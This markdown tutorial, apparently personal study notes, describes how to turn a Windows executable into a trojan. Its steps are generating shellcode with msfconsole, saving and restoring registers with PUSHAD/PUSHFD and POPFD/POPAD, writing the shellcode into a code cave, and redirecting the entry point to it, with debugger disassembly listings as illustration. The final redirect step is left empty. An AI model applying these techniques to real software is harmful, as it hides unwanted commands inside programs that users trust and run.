# Trojan

- Take the shellcode from msfconsole by following commands:

```
use payload/exec/windows (for 32-bit executable on windows)
set CMD <cmd_reqd>
set EXITFUNC <exit_point of the shellcode>
generate -f raw -o <executable_name>
```
- We are using pragma comment directive that will link the library to the exe program during the linking phase however the #include directive links it during the pre phase of the compilation.

- The syntax for MessageBox() function is (handle_name(NULL),displayed_string,title of the window,all the icons if want to be displayed)

- The PUSHAD and the PUSHFD instructions pushes all the registers and the flags into the stack defined for the function.

- Before executing our shellcode we must have all the registers and flags inside the stack frame at ESP register pointer to not get unhandled exception error.

- As after the execution of the shellcode the registers will be pushed again into the stack by the original exe thus we will have to pop all the registers and flags from the stack using 

```
POPFD
POPAD
```

- The area of code cave has to be overwritten by the shellcode in order to execute it just after we execute the entry point of the exe .

- Also we will have to set and change pointers inside the exe to point to the section we want at a specific time.

```
Code cave is the area inside an executable that is not included in the code of the executable and is null bytes after the code to just fill out the remaining size of the exe.
```

- The main motive of the shellcode should be to do what it actually wants and then execute the code back from the first without exiting from the main program .


- Starting of the exe:
```
004012E0 <main | 83E | sub esp,1C                 |
004012E3       | C70 | mov dword ptr ss:[esp],1   | [dword ptr ss:[esp]]:BaseThreadInitThunk+19
004012EA       | FF1 | call dword ptr ds:[<__set_ |
004012F0       | E8  | call main.4011B0           |
004012F5       | 8D7 | lea esi,dword ptr ds:[esi] | esi:EntryPoint, ds:[esi]:EntryPoint
004012F9       | 8DB | lea edi,dword ptr ds:[edi] | edi:EntryPoint, ds:[edi]:EntryPoint
00401300       | 83E | sub esp,1C                 |
00401303       | C70 | mov dword ptr ss:[esp],2   | [dword ptr ss:[esp]]:BaseThreadInitThunk+19
0040130A       | FF1 | call dword ptr ds:[<__set_ |
00401310       | E8  | call main.4011B0           |
00401315       | 8D7 | lea esi,dword ptr ds:[esi] | esi:EntryPoint, ds:[esi]:EntryPoint
00401319       | 8DB | lea edi,dword ptr ds:[edi] | edi:EntryPoint, ds:[edi]:EntryPoint
```

Code cave:
```
00403BC3       | 0000                  | add byte ptr ds:[eax],al   |
00403BC5       | 0000                  | add byte ptr ds:[eax],al   |
00403BC7       | 0000                  | add byte ptr ds:[eax],al   |
00403BC9       | 0000                  | add byte ptr ds:[eax],al   |
00403BCB       | 0000                  | add byte ptr ds:[eax],al   |
```

- Now we will create an instruction that will point the entry point to the required code cave first before executing the program.
```

```

